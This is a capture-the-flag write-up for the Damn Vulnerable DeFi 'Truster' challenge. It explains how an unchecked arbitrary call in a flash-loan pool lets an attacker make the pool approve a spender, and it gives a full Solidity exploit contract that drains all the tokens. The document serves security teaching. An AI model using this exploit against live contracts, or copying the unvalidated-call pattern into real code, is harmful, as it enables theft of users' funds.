CTF: https://www.damnvulnerabledefi.xyz/challenges/truster/

solution :

Pool:
Holds 1 million DVT tokens.

Offers free flash loans.

💀 Goal:
You have 0 DVT, but need to drain all 1 million DVT tokens from the pool.

And do it in one transaction.

🔥 Vulnerability in flashLoan function

function flashLoan(
    uint256 borrowAmount,
    address borrower,
    address target,
    bytes calldata data
) external {
    uint256 balanceBefore = token.balanceOf(address(this));
    require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

    token.transfer(borrower, borrowAmount);
    target.functionCall(data); // ← DANGEROUS: no validation

    uint256 balanceAfter = token.balanceOf(address(this));
    require(balanceAfter >= balanceBefore, "Flash loan not paid back");
}


🚨 Vulnerability Breakdown
1. The target.functionCall(data) lets any contract be called
There's no validation:

target can be any contract address (e.g., the DVT token contract).

data can be any payload (e.g., an approve() call).

💣 Exploitation Strategy
✅ Call flashLoan() with:

borrowAmount = 0 (we don’t care about getting any loan).

target = DVT token contract.

data = abi.encodeWithSignature("approve(address,uint256)", attacker, 1_000_000e18).

➜ This tricks the pool into calling DVT.approve(attacker, amount) from the pool’s address!

✅ After approve(), the attacker is allowed to spend all of the pool’s tokens via transferFrom().

✅ Then, simply call DVT.transferFrom(pool, attacker, 1_000_000e18) and drain the entire balance.

🧪 Proof of Concept (Exploit Contract)
Here’s a simple Solidity exploit contract:


contract TrusterExploit {
    IERC20 public immutable token;
    TrusterLenderPool public immutable pool;
    address public attacker;

    constructor(address _token, address _pool, address _attacker) {
        token = IERC20(_token);
        pool = TrusterLenderPool(_pool);
        attacker = _attacker;
    }

    function attack() external {
        // Build malicious calldata for DVT.approve(attacker, 1_000_000 ether)
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            attacker,
            1_000_000 ether
        );

        // Execute flash loan with borrowAmount = 0 but arbitrary call
        pool.flashLoan(0, attacker, address(token), data);

        // Now use transferFrom() to drain the tokens
        token.transferFrom(address(pool), attacker, 1_000_000 ether);
    }
}